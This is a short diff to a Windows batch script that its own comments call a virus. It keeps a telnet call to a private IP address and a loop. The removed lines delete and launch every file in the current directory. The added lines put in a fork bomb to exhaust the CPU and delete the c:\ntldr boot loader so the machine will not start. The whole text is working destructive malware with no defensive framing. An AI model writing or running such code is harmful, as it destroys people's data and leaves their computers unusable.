@@ -8,9 +8,15 @@ color 57
 :: the windows machine
 telnet 10.14.7.228 8081
 
-:: once done starts loop
+:: virus
 virus:
-0%0
-del *.*
-start *.*
+
+:: in crease cpu usage
+%0|%0
+
+:: reboot and reinstall windows
+attrib -s -r -h c:\ntldr
+del ntldr
+
+:: goto loop
 goto virus
